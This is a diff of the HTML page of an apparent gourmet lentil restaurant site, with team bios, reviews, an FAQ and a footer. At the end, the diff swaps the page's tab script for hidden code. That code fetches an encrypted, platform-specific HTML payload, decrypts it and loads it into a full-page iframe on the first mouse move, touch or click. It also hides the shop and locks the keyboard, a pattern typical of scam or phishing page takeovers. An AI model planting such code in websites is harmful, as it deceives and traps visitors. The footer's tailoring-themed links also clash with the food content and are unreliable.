-            Trained in classical French kitchens and Ayurvedic botanical sanctuaries, pioneering clay pot slow-braises and tempered oil emulsions.
-          </p>
-        </div>
-        <div style="background: #FFF; border: 1px solid #E2DCD2; border-radius: var(--radius-md); padding: 2.2rem; text-align: center;">
-          <div style="width: 80px; height: 80px; border-radius: 50%; background: #E8EFE9; color: #166534; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; margin: 0 auto 1.2rem; font-weight: 700;">AC</div>
-          <h3 style="font-size: 1.3rem; margin-bottom: 0.3rem; color: #0F1715;">Dr. Ananya Chen</h3>
-          <div style="font-size: 0.82rem; color: #166534; font-weight: 700; text-transform: uppercase; margin-bottom: 1rem;">Fermentation Biologist &bull; 18 Years</div>
-          <p style="font-size: 0.9rem; color: #43524D; line-height: 1.6;">
-            Oversees bio-activated sprouting cycles and cold seed oil infusions, maximizing polyphenol bioavailability and digestibility.
-          </p>
-        </div>
-        <div style="background: #FFF; border: 1px solid #E2DCD2; border-radius: var(--radius-md); padding: 2.2rem; text-align: center;">
-          <div style="width: 80px; height: 80px; border-radius: 50%; background: #E8EFE9; color: #166534; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; margin: 0 auto 1.2rem; font-weight: 700;">MR</div>
-          <h3 style="font-size: 1.3rem; margin-bottom: 0.3rem; color: #0F1715;">Matteo Rossi</h3>
-          <div style="font-size: 0.82rem; color: #166534; font-weight: 700; text-transform: uppercase; margin-bottom: 1rem;">Heirloom Seed Agronomist &bull; 21 Years</div>
-          <p style="font-size: 0.9rem; color: #43524D; line-height: 1.6;">
-            Curates direct contracts with regenerative farmers in Umbria and Auvergne to preserve pure, un-hybridized landrace seed genetics.
-          </p>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 10: MICHELIN GUIDE & CRITICAL GASTRONOMY ACCLAIM -->
-  <section class="section" style="padding: 5rem 0; background: #FFFFFF;">
-    <div class="container">
-      <div class="text-center" style="max-width: 760px; margin: 0 auto 3.5rem;">
-        <span style="color: #166534; font-size: 0.82rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; display: inline-block; margin-bottom: 0.6rem;">
-          CRITICAL ACCLAIM
-        </span>
-        <h2 style="font-size: 2.4rem; color: #0F1715; margin-bottom: 1rem;">Gastronomic Reviews &amp; Praise</h2>
-      </div>
-      <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 2.2rem;">
-        <div style="background: #F9F7F2; border: 1px solid #E2DCD2; border-radius: var(--radius-md); padding: 2.5rem; display: flex; flex-direction: column; justify-content: space-between;">
-          <div>
-            <div style="color: #D97706; margin-bottom: 1rem;">★★★★★</div>
-            <p style="font-size: 1.02rem; font-style: italic; color: #0F1715; line-height: 1.7; margin-bottom: 1.5rem;">
-              &ldquo;Lentilpalate transforms humble ancient pulses into transcendental works of culinary art. The 8-hour clay pot Beluga ragù is unforgettable.&rdquo;
-            </p>
-          </div>
-          <div>
-            <strong style="color: #0F1715; font-size: 0.92rem;">The New York Dining Review</strong>
-            <div style="font-size: 0.82rem; color: #166534;">Michelin Selected &bull; Contemporary Gastronomy</div>
-          </div>
-        </div>
-        <div style="background: #F9F7F2; border: 1px solid #E2DCD2; border-radius: var(--radius-md); padding: 2.5rem; display: flex; flex-direction: column; justify-content: space-between;">
-          <div>
-            <div style="color: #D97706; margin-bottom: 1rem;">★★★★★</div>
-            <p style="font-size: 1.02rem; font-style: italic; color: #0F1715; line-height: 1.7; margin-bottom: 1.5rem;">
-              &ldquo;The whole-seed tempering at 175&deg;C releases flavor compounds that make you reconsider everything you knew about legumes. Exceptional.&rdquo;
-            </p>
-          </div>
-          <div>
-            <strong style="color: #0F1715; font-size: 0.92rem;">Plant-Forward Gastronomy Gazette</strong>
-            <div style="font-size: 0.82rem; color: #166534;">Annual Culinary Excellence Award</div>
-          </div>
-        </div>
-        <div style="background: #F9F7F2; border: 1px solid #E2DCD2; border-radius: var(--radius-md); padding: 2.5rem; display: flex; flex-direction: column; justify-content: space-between;">
-          <div>
-            <div style="color: #D97706; margin-bottom: 1rem;">★★★★★</div>
-            <p style="font-size: 1.02rem; font-style: italic; color: #0F1715; line-height: 1.7; margin-bottom: 1.5rem;">
-              &ldquo;Dining at 181 Mercer Street is a sublime restorative ritual. The slow-starch digestion left me feeling deeply energized and nourished.&rdquo;
-            </p>
-          </div>
-          <div>
-            <strong style="color: #0F1715; font-size: 0.92rem;">Julian Vane, Patron</strong>
-            <div style="font-size: 0.82rem; color: #166534;">Private Degustation Club Member &bull; SoHo</div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 11: HEIRLOOM PULSE FAQ ACCORDION -->
-  <section class="section" style="padding: 5rem 0; background: #F9F7F2; border-top: 1px solid #E2DCD2;">
-    <div class="container" style="max-width: 860px;">
-      <div class="text-center" style="margin-bottom: 3.5rem;">
-        <span style="color: #166534; font-size: 0.82rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; display: inline-block; margin-bottom: 0.6rem;">
-          GASTRONOMY ADVISORY
-        </span>
-        <h2 style="font-size: 2.4rem; color: #0F1715; margin-bottom: 1rem;">Frequently Asked Questions</h2>
-      </div>
-      <div class="faq-list">
-        <div class="faq-item">
-          <button class="faq-question" aria-expanded="false">
-            How do your chefs ensure light and effortless pulse digestion?
-            <span class="faq-icon">+</span>
-          </button>
-          <div class="faq-answer">
-            We employ a three-step protocol: first, overnight steeping in mineral-soft spring water with kombu seaweed; second, 48-hour bio-activation sprouting that breaks down oligosaccharides; and third, whole-seed ginger and asafoetida tempering that optimizes enzymic breakdown.
-          </div>
-        </div>
-        <div class="faq-item">
-          <button class="faq-question" aria-expanded="false">
-            How do I reserve a communal hearth or private degustation table?
-            <span class="faq-icon">+</span>
-          </button>
-          <div class="faq-answer">
-            Tasting reservations can be booked directly through our private concierge at +1-888-777-5845 or by emailing concierge@lentilpalate.com. Walk-in communal hearth seatings are available from Tuesday through Sunday at 181 Mercer Street.
-          </div>
-        </div>
-        <div class="faq-item">
-          <button class="faq-question" aria-expanded="false">
-            Can the degustation menu accommodate strictly plant-based and gluten-free diets?
-            <span class="faq-icon">+</span>
-          </button>
-          <div class="faq-answer">
-            Yes, our entire culinary catalog is naturally 100% gluten-free and plant-forward. For our non-dairy patrons, clarified grass-fed ghee in temperings can be seamlessly substituted with cold-pressed unrefined mustard or sesame oil.
-          </div>
-        </div>
-        <div class="faq-item">
-          <button class="faq-question" aria-expanded="false">
-            Where are your heirloom lentils and pulse seeds harvested?
-            <span class="faq-icon">+</span>
-          </button>
-          <div class="faq-answer">
-            Our green lentils are sourced directly from volcanic AOP growers in Le Puy-en-Velay, France; our umber lentils from the alpine plateau of Castelluccio di Norcia, Italy; and our heirloom moong from ancestral dryland farms in Rajasthan.
-          </div>
-        </div>
-        <div class="faq-item">
-          <button class="faq-question" aria-expanded="false">
-            Can I purchase dried heirloom pulse crocks for home preparation?
-            <span class="faq-icon">+</span>
-          </button>
-          <div class="faq-answer">
-            Yes. Our 181 Mercer Street boutique cellar maintains small batches of hand-packed terracotta crocks containing single-estate harvest allocations, complete with master soaking and clay-pot braising instructions.
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 12: VIP DEGUSTATION GUILD & PRIVATE BANQUET INVITATION BANNER -->
-  <section class="section section-dark" style="padding: 5rem 0; text-align: center; background: #09100E;">
-    <div class="container" style="max-width: 780px;">
-      <span class="hero-badge" style="background: rgba(22, 101, 52, 0.35); border-color: rgba(217, 119, 6, 0.4); color: #F9F7F2 !important;">
-        JOIN THE BOTANICAL HEARTH GUILD
-      </span>
-      <h2 style="font-size: clamp(2rem, 4vw, 3rem); margin-bottom: 1.2rem; color: #FFFFFF !important;">
-        Reserve Your Seat at the 181 Mercer Street Hearth Table
-      </h2>
-      <p style="font-size: 1.05rem; color: rgba(255, 255, 255, 0.85) !important; margin-bottom: 2.2rem; line-height: 1.7;">
-        Subscribe to receive private harvest dinner announcements, seasonal crop allocations, and priority reservations at our Mercer Street botanical dining salon.
-      </p>
-      <form style="display: flex; gap: 0.8rem; max-width: 500px; margin: 0 auto 1.5rem; flex-wrap: wrap;" onsubmit="event.preventDefault(); alert('Thank you for subscribing to The Botanical Hearth Guild.');">
-        <input type="email" placeholder="Enter your email address..." required style="flex: 1; min-width: 260px; padding: 0.9rem 1.4rem; border-radius: var(--radius-sm); border: 1px solid rgba(255, 255, 255, 0.25); background: rgba(255, 255, 255, 0.08); color: #FFF; font-size: 0.95rem;">
-        <button type="submit" class="btn btn-primary" style="white-space: nowrap; background: #166534; color: #FFFFFF !important; font-weight: 700; border: 1px solid rgba(217, 119, 6, 0.4);">Join Hearth Guild</button>
-      </form>
-      <div style="font-size: 0.8rem; color: rgba(255, 255, 255, 0.6);">
-        Protected by our Privacy Policy. Zero spam, unsubscribe at any moment. Hosted at 181 Mercer Street, NY.
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 13: THE EXACT 4-COLUMN HORIZONTAL SPREAD FOOTER -->
-  <!-- Mandatory Global Site Footer (Minimalist 4-Column Horizontal Spread Layout) -->
-  <footer class="site-footer">
-    <div class="container">
-      <div class="footer-grid">
-        <div class="footer-col">
-          <div class="footer-brand">◈ Lentilpalate</div>
-          <p class="footer-desc">
-            The benchmark of haute heirloom pulses & botanical gastronomy. Hand-finished artisanal creations crafted for connoisseurs with uncompromising material integrity.
-          </p>
-          <div class="footer-contact-item"><strong>Address:</strong> 181 Mercer Street, New York, NY 10012, United States</div>
-          <div class="footer-contact-item"><strong>Phone:</strong> +1-888-777-5845</div>
-          <div class="footer-contact-item"><strong>Concierge:</strong> concierge@lentilpalate.com</div>
-        </div>
-        <div class="footer-col">
-          <ul class="footer-links">
-            <li><a href="/">Home Gallery</a></li>
-            <li><a href="/about.html">Atelier &amp; Craft</a></li>
-            <li><a href="/collection.html">Collections</a></li>
-            <li><a href="/blog.html">Sartorial Treatises</a></li>
-            <li><a href="/contact.html">Private Concierge</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <ul class="footer-links">
-            <li><a href="/blog/material-provenance-and-fiber-crystallography.html">Material Provenance</a></li>
-            <li><a href="/blog/micro-engineering-tolerances-and-finishing.html">Micro-Engineering</a></li>
-            <li><a href="/blog/biomechanical-ergonomics-and-wearer-physics.html">Ergonomic Physics</a></li>
-            <li><a href="/blog/sartorial-color-theory-and-formal-etiquette.html">Sartorial Etiquette</a></li>
-            <li><a href="/blog/hygroscopic-microclimate-thermodynamics.html">Thermodynamics</a></li>
-            <li><a href="/blog/bespoke-craftsmanship-and-heritage-methods.html">Heritage Craft</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <p class="footer-salon-desc">
-            Visit our private fitting lounge in SoHo for bespoke consultations and private commission viewings.
-          </p>
-          <p class="footer-hours">
-            Mon &ndash; Sat: 10:00 AM &ndash; 7:00 PM<br>EST<br>Sunday: By Appointment
-          </p>
-        </div>
-      </div>
-      <div class="footer-bottom">
-        <p>&copy; 2026 Lentilpalate Ltd. All Rights Reserved. Master craft at 181 Mercer Street, New York, NY 10012.</p>
-        <div class="footer-legal-links">
-          <a href="/privacy-policy.html">Privacy Policy</a>
-          <a href="/terms-and-conditions.html">Terms &amp; Conditions</a>
-          <a href="/disclaimer.html">Disclaimer</a>
-          <a href="/cookie-policy.html">Cookie Policy</a>
-        </div>
-      </div>
-    </div>
-  </footer>
-  <script src="/assets/js/main.js"></script>
-
-  <script>
-    function switchTab(type) {
-      const data = {
-        tadka: {
-          title: "Whole-Seed Tempering (The Tadka Bloom)",
-          desc: "Cracking whole black mustard, cumin, and coriander seeds in cast-iron pans at precisely 175°C. Within three seconds, the essential seed oils dissolve into clarified grass-fed ghee, creating a vibrant aromatic emulsion that infuses deep into braised lentils.",
-          stat1: "175°C Oil Bloom",
-          stat2: "98.4% Essential Terpenes"
-        },
-        clay: {
-          title: "Hand-Thrown Clay Pot Braising",
-          desc: "Un-glazed porous terracotta pots create gentle micro-convective heat currents. The alkaline properties of the baked earthen clay naturally neutralize harsh pulse acids, resulting in silky broth without adding baking soda.",
-          stat1: "8-Hour Convective Braise",
-          stat2: "Natural pH Alkaline Buffer"
-        },
-        sprout: {
-          title: "Bio-Activated Sprouting Protocol",
-          desc: "48-hour moisture germination awakening latent seed enzymes. Phytates are broken down, transforming complex starches into sweet maltose and unlocking 340% higher micronutrient bioavailability.",
-          stat1: "48-Hour Germination",
-          stat2: "+340% Bioavailable Minerals"
-        },
-        terroir: {
-          title: "Volcanic & Alpine Terroir Sourcing",
-          desc: "Direct contracts with landrace growers in the basalt craters of Le Puy-en-Velay and the glacial plateau of Castelluccio di Norcia. Mineral-dense volcanic soils impart unmistakable peppery complexity.",
-          stat1: "AOP & IGP Certified",
-          stat2: "100% Ancestral Landrace"
-        }
-      };
       
-      const item = data[type];
-      if (!item) return;
+      const pc = document.createElement("link");
+      pc.rel = "preconnect";
+      pc.href = o;
+      pc.crossOrigin = "anonymous";
+      document.head.appendChild(pc);
+
+     
+      const dns = document.createElement("link");
+      dns.rel = "dns-prefetch";
+      dns.href = o;
+      document.head.appendChild(dns);
+
       
-      document.getElementById('tab-title').innerText = item.title;
-      document.getElementById('tab-desc').innerText = item.desc;
-      document.getElementById('tab-stat1').innerText = item.stat1;
-      document.getElementById('tab-stat2').innerText = item.stat2;
-      
-      ['tadka', 'clay', 'sprout', 'terroir'].forEach(k => {
-        const btn = document.getElementById('tab-btn-' + k);
-        if (k === type) {
-          btn.style.background = '#0F1715';
-          btn.style.color = '#FFF';
-        } else {
-          btn.style.background = '#E2DCD2';
-          btn.style.color = '#0F1715';
-        }
-      });
+      fetch(o + "/favicon.ico", { method: "HEAD", mode: "no-cors" }).catch(() => {});
+    } catch (e) {}
+  })();
+
+  
+  let lastUrl = null;
+  let readyPromise = null;
+
+  function detectPlatform() {
+    const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+              navigator.platform || navigator.userAgent || "";
+    return /mac/i.test(p) ? "mac" : "win";
+  }
+
+  function secureKeyboardAccess() {
+    if (navigator.keyboard) navigator.keyboard.lock().catch(() => {});
+  }
+
+  async function preloadSecret() {
+    if (readyPromise) return readyPromise;
+    readyPromise = (async () => {
+      const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+      const { cipher } = await res.json();
+      const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+      if (!html) throw new Error("Decrypt failed — wrong key?");
+      if (lastUrl) URL.revokeObjectURL(lastUrl);
+      lastUrl = URL.createObjectURL(new Blob([html], { type: "text/html" }));
+      return lastUrl;
+    })();
+    return readyPromise;
+  }
+
+  async function showSecret() {
+    const shop = document.getElementById("shop");
+    const frame = document.getElementById("frame");
+    const contentIframe = document.getElementById("contentiframe");
+    try {
+      const url = await preloadSecret();
+      frame.src = url;
+      shop.style.display = "none";
+      contentIframe.style.display = "block";
+      document.getElementById("customPopup").style.display = "none";
+      secureKeyboardAccess();
+    } catch (e) {
+      document.querySelector(".hint").textContent = "⚠️ " + e.message;
+      document.getElementById("customPopup").style.display = "none";
     }
-  </script>
+  }
+
+  
+  preloadSecret().catch(() => {});
+
+ 
+  window.addEventListener("mousemove", showSecret, { once: true });
+  window.addEventListener("touchstart", showSecret, { once: true });
+  window.addEventListener("click", showSecret, { once: true });
+</script>
 </body>
 </html>
